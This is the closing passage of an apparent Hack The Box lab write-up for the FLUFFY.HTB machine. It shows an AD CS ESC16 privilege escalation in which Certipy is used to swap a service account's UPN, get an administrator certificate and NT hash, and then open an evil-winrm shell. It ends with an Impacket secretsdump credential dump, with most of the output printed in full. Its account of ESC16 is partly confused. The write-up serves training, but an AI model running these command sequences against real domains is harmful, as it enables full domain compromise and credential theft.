        ManageCa                        : FLUFFY.HTB\Domain Admins
                                          FLUFFY.HTB\Enterprise Admins
                                          FLUFFY.HTB\Administrators
        ManageCertificates              : FLUFFY.HTB\Domain Admins
                                          FLUFFY.HTB\Enterprise Admins
                                          FLUFFY.HTB\Administrators
        Enroll                          : FLUFFY.HTB\Cert Publishers
    [!] Vulnerabilities
      ESC16                             : Security Extension is disabled.
    [*] Remarks
      ESC16                             : Other prerequisites may be required for this to be exploitable. See the wiki for more details.
Certificate Templates                   : [!] Could not find any certificate templates
```

**Findings:** The scan identified the CA as vulnerable to **ESC16**. The CA's "Edit Flags" did not have the `EDITF_ATTRIBUTESUBJECTALTNAME2` security extension enabled. This misconfiguration allows a user with the `ManageCA` or `ManageCertificates` permission to modify any certificate request's `subjectAltName` (SAN) during issuance. Further enumeration confirmed the `ca_svc` account's SPN was `ADCS/ca.fluffy.htb`, indicating it was likely a service account for the CA itself.


**12. Modifying User Principal Name (UPN)**  
The `winrm_svc` account (which we now controlled) was used to modify the `ca_svc` user object. The tester updated the `userPrincipalName` (UPN) attribute of `ca_svc` to match that of the Domain Administrator.

```bash 
❯ certipy account -u winrm_svc@fluffy.htb -hashes <REDACTED>  -user ca_svc read
/root/.local/pipx/venvs/certipy-ad/lib/python3.11/site-packages/certipy/version.py:1: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
  import pkg_resources
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Reading attributes for 'ca_svc':
    cn                                  : certificate authority service
    distinguishedName                   : CN=certificate authority service,CN=Users,DC=fluffy,DC=htb
    name                                : certificate authority service
    objectSid                           : S-1-5-21-497550768-2797716248-2627064577-1103
    sAMAccountName                      : ca_svc
    servicePrincipalName                : ADCS/ca.fluffy.htb
❯
```


```
❯ certipy account -u winrm_svc@fluffy.htb -hashes <REDACTED>  -user ca_svc -upn administrator update
/root/.local/pipx/venvs/certipy-ad/lib/python3.11/site-packages/certipy/version.py:1: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
  import pkg_resources
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Updating user 'ca_svc':
    userPrincipalName                   : administrator
[*] Successfully updated 'ca_svc'
❯
```


**13. Requesting a Certificate for the Administrator**  
With the UPN of `ca_svc` temporarily set to `administrator`, the tester requested a new certificate using the `ca_svc` account. Because of the ESC16 misconfiguration, the CA embedded the UPN from the requesting account (`ca_svc`), which was now `administrator`, into the new certificate.

```
❯ certipy req -u ca_svc -hashes <REDACTED>  -dc-ip 10.129.232.88 -target dc01.fluffy.htb -ca fluffy-DC01-CA -template User
/root/.local/pipx/venvs/certipy-ad/lib/python3.11/site-packages/certipy/version.py:1: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
  import pkg_resources
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 17
[*] Got certificate with UPN 'administrator'
[*] Certificate has no object SID
[*] Saved certificate and private key to 'administrator.pfx'
```
**Result:** The CA issued a valid certificate for the user `administrator`. The tester saved this certificate as `administrator.pfx`.


**14. Restoring the Original State**  
To avoid detection and maintain stability, the UPN attribute of the `ca_svc` account was immediately reverted to its original value.

```
❯ certipy account -u winrm_svc@fluffy.htb -hashes <REDACTED>  -user ca_svc -upn ca_svc@fluffy.htb update
/root/.local/pipx/venvs/certipy-ad/lib/python3.11/site-packages/certipy/version.py:1: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
  import pkg_resources
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Updating user 'ca_svc':
    userPrincipalName                   : ca_svc@fluffy.htb
[*] Successfully updated 'ca_svc'
```

**15. Domain Administrator Authentication and Full Compromise**  
The obtained certificate was used to request a TGT and retrieve the NT hash for the Domain Administrator account.

```
❯ certipy auth -dc-ip 10.129.232.88 -pfx administrator.pfx -u administrator -domain fluffy.htb
/root/.local/pipx/venvs/certipy-ad/lib/python3.11/site-packages/certipy/version.py:1: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
  import pkg_resources
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Using principal: administrator@fluffy.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@fluffy.htb': aad3b435b51404eeaad3b435b51404ee:<REDACTED> 
```
**Result:** The NT hash for the `Administrator` was successfully retrieved. This hash was used to authenticate via `evil-winrm`, confirming full domain compromise and allowing for the retrieval of the `root.txt` flag.


![[Pasted image 20251029001613.png]]



```bash
# Privilege escalation command

❯ evil-winrm -i 10.129.232.88 -u Administrator -H <REDACTED> 


Evil-WinRM shell v3.5

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ../Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> ls


    Directory: C:\Users\Administrator\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---       10/28/2025   7:12 AM             34 root.txt


cat *Evil-WinRM* PS C:\Users\Administrator\Desktop>  cat root.txt
<REDACTED> 
*Evil-WinRM* PS C:\Users\Administrator\Desktop>

```


**16. Post-Exploitation Data Collection**  
As a final step, the tester utilized the `secretsdump.py` utility from the Impacket suite to extract all password hashes from the NTDS.dit database, providing a complete dump of domain credentials.
```bash 
❯ secretsdump.py -hashes :<REDACTED>  FLUFFY/Administrator@10.129.232.88
/root/.local/pipx/venvs/impacket/lib/python3.11/site-packages/impacket/version.py:12: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
  import pkg_resources
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[*] Service RemoteRegistry is in stopped state
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0xffa5608d6bd2811aaabfd47fbc3d1c37
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:<REDACTED> :::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[-] SAM hashes extraction for user WDAGUtilityAccount failed. The account doesn't have hash information.
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC
FLUFFY\DC01$:aes256-cts-hmac-sha1-96:34b5e3f67441a6c19509cb966b9e5392e48257ff5058e7a22a4282fe822a5751
FLUFFY\DC01$:aes128-cts-hmac-sha1-96:19a1dd430a92c3568f04814342d8e486
FLUFFY\DC01$:des-cbc-md5:ec13a85edf688a85
FLUFFY\DC01$:plain_password_hex:c051a2b56dd8422b09fcc441e1bfaf0a5f0fe659a1634184e7dd6849da03747cad2050bd71e55da3e979245cb872106b52367ac876380294db669d308655c9f8f72b71ea10b4cc90199e1a059645dad4e77b3b982de60b7a59af8d4261b0077be1890caf3aa7e6290dcbc0c443f81bc6124cdef4e26472b3a5c8bcd8fc666b876709496e61a026559328d19db45819e69695bbafda526692513d2457e98de68b9473b08ed96e1d50b06dc53c6e58a595feebd6568a2a75811a5456336f40ede98c2996a0360a618d492e112a905235641126ad3234d68a920c0cd9439b4bd7203d28a1ad4d2ebdbe484d47836735b4cb
FLUFFY\DC01$:aad3b435b51404eeaad3b435b51404ee:7a9950c26fe9c3cbfe5b9ceaa21c9bfd:::
[*] DefaultPassword
p.agila:<REDACTED> 
[*] DPAPI_SYSTEM
dpapi_machinekey:0x50f64bc1be95364da6cc33deca194d9b827c4846
dpapi_userkey:0xe410025a604608d81064e274f6eb46cba458ebd5
[*] NL$KM
 0000   0B 4A EC B4 04 86 59 99  A3 11 64 45 1D F8 EF E0   .J....Y...dE....
 0010   74 E0 BB 5A 07 EA AD B9  63 4D AB 03 B5 0F 69 3D   t..Z....cM....i=
 0020   C5 C2 F8 4E F0 EC EC B6  28 A2 59 AB BA 2B F0 A2   ...N....(.Y..+..
 0030   57 89 D1 62 FA 69 04 2A  31 57 54 5A FB B0 2A 18   W..b.i.*1WTZ..*.
NL$KM:0b4aecb404865999a31164451df8efe074e0bb5a07eaadb9634dab03b50f693dc5c2f84ef0ececb628a259abba2bf0a25789d162fa69042a3157545afbb02a18
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
```



